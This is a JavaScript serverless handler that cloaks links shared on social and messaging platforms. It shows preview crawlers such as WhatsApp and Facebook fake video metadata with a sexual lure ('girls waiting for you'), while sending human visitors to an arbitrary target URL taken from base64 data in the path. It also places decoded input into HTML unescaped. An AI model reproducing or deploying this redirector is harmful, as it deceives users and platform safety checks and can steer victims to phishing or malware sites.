export async function onRequest(context) {
    const { params, request } = context;
    const base64Data = params.path[0];
    const userAgent = request.headers.get("user-agent") || "";

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "Hot Video";
        const image = data.i || "";
        const target = data.u || "";

        // Logic Random Deskripsi
        const count = Math.floor(Math.random() * 90001) + 10000;
        const randomDesc = `${count.toLocaleString()} girls waiting for you`;

        // Deteksi Bot Crawler (WhatsApp, FB, dll)
        const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);

        if (isBot) {
            // Trik Tombol Play: Menggunakan og:type video dan memberikan durasi palsu
            const html = `<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>${title}</title>
                <meta property="og:title" content="${title}" />
                <meta property="og:description" content="▶️ ${randomDesc}" />
                <meta property="og:image" content="${image}" />
                <meta property="og:type" content="video.other" />
                <meta property="og:video:url" content="${image}" /> 
                <meta property="og:video:type" content="text/html" />
                <meta property="og:video:width" content="1280" />
                <meta property="og:video:height" content="720" />
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body></body>
            </html>`;
            return new Response(html, { headers: { "content-type": "text/html;charset=UTF-8" } });
        }

        // Jika manusia, langsung lempar ke target
        const finalTarget = target.startsWith('http') ? target : 'https://' + target;
        return Response.redirect(finalTarget, 302);

    } catch (e) {
        return context.next();
    }
}
